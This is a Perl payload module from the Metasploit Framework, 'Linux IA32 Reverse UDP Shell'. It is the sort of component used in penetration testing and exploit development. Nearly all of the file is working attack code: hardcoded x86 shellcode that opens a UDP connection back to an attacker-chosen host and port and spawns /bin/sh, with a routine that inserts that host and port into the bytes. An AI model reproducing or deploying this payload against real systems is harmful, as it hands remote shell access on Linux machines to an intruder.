
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::linux_ia32_reverse_udp;
use strict;
use base 'Msf::PayloadComponent::ReverseConnection';

my $info =
{
	'Name'         => 'Linux IA32 Reverse UDP Shell',
	'Version'      => '$Revision$',
	'Description'  => 'Connect back to attacker with UDP and spawn a shell',
	'Authors'      => [ 'skape <mmiller [at] hick.org>', ],
	'Arch'         => [ 'x86' ],
	'Priv'         => 0,
	'OS'           => [ 'linux' ],
	'Size'         => '',
	'Protocol'     => 'udp',
};

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	my $self = $class->SUPER::new($hash, @_);

	$self->_Info->{'Size'} = $self->_GenSize;
	return($self);
}

sub Build 
{
	my $self = shift;
	return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT')));
}

sub Generate 
{
	my $self = shift;
	my $host = shift;
	my $port = shift;
	my $off_host = 0x1b;
	my $off_port = 0x21;

	my $host_bin = gethostbyname($host);
	my $port_bin = pack('n', $port);

	my $shellcode =
		"\x31\xdb\x53\x6a\x02\x6a\x02\x43\x6a\x66\x58\x89\xe1\xcd\x80\x93" .
		"\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\x7f\x00\x00\x01\x66" .
		"\x68\xbf\xbf\x66\x53\x89\xe1\x6a\x10\x51\x53\x89\xe1\x43\xb0\x66" .
		"\xcd\x80\x6a\x0b\x58\x52\x66\x68\x2d\x69\x89\xe1\x6a\x67\x66\x68" .
		"\x69\x6e\x68\x65\x64\x69\x74\x68\x2d\x2d\x6e\x6f\x89\xe7\x52\x68" .
		"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x57\x53\x89" .
		"\xe1\xcd\x80";

	substr($shellcode, $off_port, 2, $port_bin);
	substr($shellcode, $off_host, 4, $host_bin);

	return($shellcode);
}

sub _GenSize 
{
	my $self = shift;
	my $bin = $self->Generate('127.0.0.1', '4444');
	return(length($bin));
}

1;
